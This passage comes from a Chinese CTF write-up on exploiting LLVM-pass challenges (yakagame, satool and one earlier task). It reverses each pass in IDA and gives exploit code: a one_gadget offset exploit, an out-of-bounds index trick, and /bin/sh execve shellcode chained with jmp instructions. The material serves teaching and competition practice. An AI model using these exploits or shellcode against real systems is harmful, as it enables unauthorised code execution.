<p>这个函数大致一看就是往src里填充内容,但不太能知道<code>v20</code>是个啥,这时候可以进行一些调试,写一个<code>save(0x1,0x2,0x3,0x4.....);</code>这样的函数,然后去调试判断</p>
<p>在<code>stealkey</code>中有这么一句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte_204100 = *byte_2040f8;</span><br></pre></td></tr></table></figure>
<p>然后在<code>fakekey</code>中又有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v59 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v58 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*(_QWORD *)v58 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v59 + SExtValue;</span><br><span class="line">*byte_2040f8 = v59 + SExtValue;</span><br></pre></td></tr></table></figure>
<p><code>SExtValue</code>是我们传递的参数</p>
<p>也就是说我们可以在一定范围修改<code>byte_2040f8</code>的值,那么如果上面残余了libc的指针,就能够修改为onegadget</p>
<p>那么就要如何确保其上残余libc地址了</p>
<p>第一次malloc之前</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_164911.png" alt=""></p>
<p>那么我们只需要取一次chunk,之后的fd字段就会残余地址了</p>
<p><strong>exp:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	save(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;\n&quot;</span>);<span class="comment">//第一个参数为空字符串,是为了不将其复制到chunk中</span></span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);</span><br><span class="line">	run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2022qwb-yakagame"><a href="#2022qwb-yakagame" class="headerlink" title="2022qwb-yakagame"></a>2022qwb-yakagame</h2><p>不多说,直接打开<code>yaka.so</code>,找到注册的类名字是<code>ayaka</code></p>
<p>重写的ROF函数是<code>sub_C880</code></p>
<p>针对<code>gamestart</code>函数,然后内部又是一堆调用函数处理</p>
<p><code>fight</code>函数中存在一个后门</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (__int64)*score &gt; <span class="number">0x12345678</span> )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure>
<p>不过需要当分数大于0x12345678才能调用</p>
<p>如何触发后门函数呢？<code>weaponlist[]</code>数组是<code>char</code>类型的，即单字节，就算比<code>boss</code>值要大，其差值也不可能大于<code>0x12345678</code>。</p>
<p>继续往后看，后面逆向也都不难，<code>merge</code>函数可以将一个<code>weaponlist</code>的值加到另一个上，<code>destroy</code>可以将指定<code>weaponlist</code>清零，<code>upgrade</code>可以将所有<code>weaponlist</code>的值都加上某一个数值。</p>
<p>接着，会有四个奇怪的函数，像是拼音，也不知道啥意思：<code>wuxiangdeyidao</code>，<code>zhanjinniuza</code>，<code>guobapenhuo</code>，<code>tiandongwanxiang</code>可以对<code>cmd</code>字符串中每个字符都进行同样的操作。由此可以想到，可通过这四个函数对<code>cmd</code>字符串原有的内容解密成某个命令。</p>
<p><code>cmd</code>开始是由<code>src</code>复制过来的，其中内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000011401                               ; const char src</span><br><span class="line">.rodata:0000000000011401 92                            src db 92h                              ; DATA XREF: sub_C880+6F↑o</span><br><span class="line">.rodata:0000000000011402 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011403 7B                            db  7Bh ; &#123;</span><br><span class="line">.rodata:0000000000011404 27                            db  27h ; &#x27;</span><br><span class="line">.rodata:0000000000011405 6D                            db  6Dh ; m</span><br><span class="line">.rodata:0000000000011406 93                            db  93h</span><br><span class="line">.rodata:0000000000011407 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011408 66                            db  66h ; f</span><br><span class="line">.rodata:0000000000011409 00                            db    0</span><br></pre></td></tr></table></figure>
<p>可以看到其中第二个和第七个字符一样，而那四个函数每次又是对所有字符做同样的操作，因此不难联想到最后解密成的命令很可能是<code>cat flag</code>，写个脚本爆破一下即可。不过这题实际上也不用如此，继续对后面进行分析就知道了。</p>
<p>后面就是一个<code>else</code>条件分支，也就是说当调用的函数不是上面提及的所有函数的时候，就会进入这个分支。这里用了<code>C++ STL</code>里的<code>map</code>，<code>map</code>可在任意类型的值之间建立映射关系，并且会按关键字从小到大排序。如：<code>map[&quot;abc&quot;] = 123</code>就将<code>abc</code>这个字符串与<code>123</code>这个数值间建立了映射关系，并且在通过迭代器遍历<code>map</code>的时候，关键字<code>abc</code>会在关键字<code>abd</code>之前遍历到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">          &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">          <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v24 = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator-&gt;(&amp;v34);</span><br><span class="line">  weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">++v33;</span><br></pre></td></tr></table></figure>
<p>在这个<code>else</code>分支中，会先遍历<code>map</code>，查找是否有调用的这个函数名作为<code>key</code>，其第一个参数作为<code>value</code>的映射关系。</p>
<p>若是有，则会将<code>weaponlist[]</code>数组下标对应<code>map</code>中此映射关系位置的值改为这个<code>value</code>。<strong>若没有，则会将这个新映射关系加入<code>map</code>中。</strong></p>
<p>我们注意到，此处的<code>v33</code>是有符号的<code>char</code>类型，其范围是<code>-128~127</code>，<u>故当<code>map</code>中映射关系很多的时候，<code>v33</code>会是负数，此处也就存在一个数组下标越界的漏洞了。</u></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000002169A8                               public cmd</span><br><span class="line">.bss:00000000002169A8                               ; char *cmd</span><br><span class="line">.bss:00000000002169A8 ?? ?? ?? ?? ?? ?? ?? ??       cmd dq ?                                ; DATA XREF: LOAD:0000000000002468↑o</span><br><span class="line">.bss:00000000002169A8                                                                       ; .got:cmd_ptr↑o</span><br><span class="line">.bss:00000000002169B0                               public score</span><br><span class="line">.bss:00000000002169B0 ??                            score db    ? ;                         ; DATA XREF: LOAD:0000000000001340↑o</span><br><span class="line">.bss:00000000002169B0                                                                       ; .got:score_ptr↑o</span><br><span class="line">.bss:00000000002169B1 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B2 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B3 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B4 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B5 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B6 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B7 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B8 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B9 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BA ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BB ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BC ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BD ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BE ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BF ??                            db    ? ;</span><br><span class="line">.bss:00000000002169C0                               public weaponlist</span><br><span class="line">.bss:00000000002169C0                               ; char weaponlist[256]</span><br><span class="line">.bss:00000000002169C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+weaponlist db 100h dup(?) </span><br></pre></td></tr></table></figure>
<p>如上图，可以看到<code>cmd</code>指针和<code>score</code>指针都在<code>weaponlist</code>之前，故可以通过这个数组下标越界漏洞，修改<code>score</code>指针的最后一字节[-16]，使其错位，从而指向很大的数字，触发后门函数。</p>
<p>由于<code>opt</code>没开<code>PIE</code>保护，故直接将<code>cmd</code>指针指向<code>opt</code>中的某个字符串末尾的<code>sh</code>即可</p>
<p>一个生成exp模板的脚本,对生成的文件进行微调即可完成要求</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">	s = <span class="built_in">str</span>(i)</span><br><span class="line">	s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;void func&quot;</span> + s + <span class="string">&quot;(int x);&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">	s = <span class="built_in">str</span>(i)</span><br><span class="line">	s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;func&quot;</span> + s + <span class="string">&quot;(0);&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="2022ciscn-satool"><a href="#2022ciscn-satool" class="headerlink" title="2022ciscn-satool"></a>2022ciscn-satool</h2><p>注册Pass叫做mba,重写的ROF函数是<code>`anonymous namespace&#39;::MBAPass::runOnFunction</code></p>
<p>函数真正需要关注的部分只有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous namespace<span class="number">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);</span><br><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode(</span><br><span class="line">        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> this[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)this, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先将<code>this[4]</code>页置为可写可执行,执行handler函数</p>
<p>再将<code>this[4]</code>页置为可读可执行,执行<code>this[4]</code>处的代码</p>
<p>经过调试可以知道this[4]被全部初始化为c3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_212830.png" alt=""></p>
<p>那么重点就是handle了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::front(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);</span><br><span class="line">Operand = llvm::User::getOperand(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">  SExtValue = llvm::ConstantInt::getSExtValue(v2);</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, SExtValue);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是倒序对基本块中的指令进行处理的，<code>getTerminator</code>函数是取末尾的指令，第一个<code>if</code>判断末尾指令的第一个操作数是否是常数，第二个<code>else if</code>判断末尾指令的第一个操作数是否为函数的参数，如果都不是，说明是变量，那就进入到最后<code>else</code>的分支。</p>
<p>出题人实现了四个函数用于写指令</p>
<ul>
<li>writeMovImm64 给rax或rbx立即数</li>
<li>writeInc <code>inc rax</code></li>
<li>writeOpReg <code>add rax,rbx</code></li>
<li>writeRet 写<code>ret</code></li>
</ul>
<p>但这些shellcode似乎并没办法能够构造完成getshell</p>
<p>所以这题最后利用的是反复执行RunOnFunction的时候,<u>this[4]的内容是不会被重置的</u></p>
<p>因为其是在构造函数中进行初始化的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::MBAPass(<span class="type">void</span> **this)</span><br><span class="line">&#123;</span><br><span class="line">  llvm::FunctionPass::FunctionPass((llvm::FunctionPass *)this, `anonymous namespace<span class="number">&#x27;</span>::MBAPass::ID);</span><br><span class="line">  *this = (<span class="type">char</span> *)&amp;`vtable <span class="keyword">for</span><span class="number">&#x27;</span>`anonymous namespace<span class="number">&#x27;</span>::MBAPass + <span class="number">16</span>;</span><br><span class="line">  this[<span class="number">4</span>] = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(this[<span class="number">4</span>], <span class="number">195</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析发现，<u>一个<code>sub</code>或者<code>add</code>的<code>IR</code>对应的<code>shellcode</code>是13个字节</u>：,那么我们可以这样构造</p>
<p>第一次利用add rax功能在这个区域留下一些jmp指令</p>
<p>然后第二次输入shellcode恰好覆盖到执行jmp指令,并且在第二次输入shellcode的时候提前利用add rax功能<u>分多次布置好shellcode并使用jmp跳转指令连接</u></p>
<p>最后由于这题的<code>LLVM IR</code>中指令的操作符只能是<code>add</code>或<code>sub</code>，故不能用<code>C</code>语言直接编译生成<code>LLVM IR</code>文件，不然会有很多其他的操作符。</p>
<p><u>可以先用<code>C</code>语言写两个空函数</u>，再通过<code>clang-12</code>对其编译生成<code>ll</code>文件，<u>然后直接在<code>ll</code>文件中仿照之前的题目手写<code>LLVM IR</code></u></p>
<p><strong>模板脚本:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">319</span>):</span><br><span class="line">	payload = <span class="string">&quot;  %&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; = add nsw i64 %&quot;</span> + <span class="built_in">str</span>(i-<span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="string">&quot;1024&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
<p><strong>shellcode:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line">	<span class="string">&quot;mov edi, 0x68732f6e&quot;</span>,<span class="comment">#为了长度不长于6,所以选择/bin/sh分两次写</span></span><br><span class="line">	<span class="string">&quot;shl rdi, 24&quot;</span>,<span class="comment">#左移三个字节</span></span><br><span class="line">	<span class="string">&quot;mov ebx, 0x69622f&quot;</span>,</span><br><span class="line">	<span class="string">&quot;add rdi, rbx&quot;</span>,<span class="comment">#剩余部分,通过ebx加上</span></span><br><span class="line">	<span class="string">&quot;push rdi&quot;</span>,</span><br><span class="line">	<span class="string">&quot;push rsp&quot;</span>,</span><br><span class="line">	<span class="string">&quot;pop rdi&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xor rsi, rsi&quot;</span>,</span><br><span class="line">	<span class="string">&quot;xor rdx, rdx&quot;</span>,</span><br><span class="line">	<span class="string">&quot;push 59&quot;</span>,</span><br><span class="line">	<span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sc <span class="keyword">in</span> shellcode:</span><br><span class="line">	<span class="built_in">print</span>(u64(asm(sc).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xEB&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(u16(<span class="string">b&#x27;\xEB\xE4&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="逆向定位"><a href="#逆向定位" class="headerlink" title="逆向定位"></a>逆向定位</h2><p>一般情况下,ctf中llvm类题目都是重写了<code>FunctionPass</code>类中的<code>runOnFunction</code>函数</p>
<p>那么该如何定位到重写的<code>runOnFunction</code>函数</p>
<p>只需要打开so文件,在ida中搜索文本<code>vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DD10                               ; `vtable for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD10 00 00 00 00 00 00 00 00       _ZTVN12_GLOBAL__N_16VMPassE dq 0        ; offset to this</span><br><span class="line">LOAD:000000000020DD18 B0 DD 20 00 00 00 00 00       dq offset _ZTIN12_GLOBAL__N_16VMPassE   ; `typeinfo for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD20 80 67 00 00 00 00 00 00       off_20DD20 dq offset sub_6780           ; DATA XREF: sub_6720+30↑o</span><br><span class="line">LOAD:000000000020DD28 D0 67 00 00 00 00 00 00       dq offset sub_67D0</span><br><span class="line">LOAD:000000000020DD30 E0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void)</span><br><span class="line">LOAD:000000000020DD38 30 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD40 80 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD48 80 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*)</span><br><span class="line">LOAD:000000000020DD50 08 EB 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;)</span><br><span class="line">LOAD:000000000020DD58 F0 EA 20 00 00 00 00 00       dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">LOAD:000000000020DD60 C0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">LOAD:000000000020DD68 B0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void)</span><br><span class="line">LOAD:000000000020DD70 D8 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">LOAD:000000000020DD78 00 EB 20 00 00 00 00 00       dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void)</span><br><span class="line">LOAD:000000000020DD80 A0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*)</span><br><span class="line">LOAD:000000000020DD88 78 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void)</span><br><span class="line">LOAD:000000000020DD90 C8 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void)</span><br><span class="line">LOAD:000000000020DD98 D0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void)</span><br><span class="line">LOAD:000000000020DDA0 98 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">LOAD:000000000020DDA8 30 68 00 00 00 00 00 00       dq offset sub_6830</span><br><span class="line">LOAD:000000000020DDB0                               ; public `anonymous namespace&#x27;::VMPass</span><br></pre></td></tr></table></figure>
<p>一般最后一项就是重写的<code>runOnFunction</code>函数</p>
<p>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  sub_6510((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span 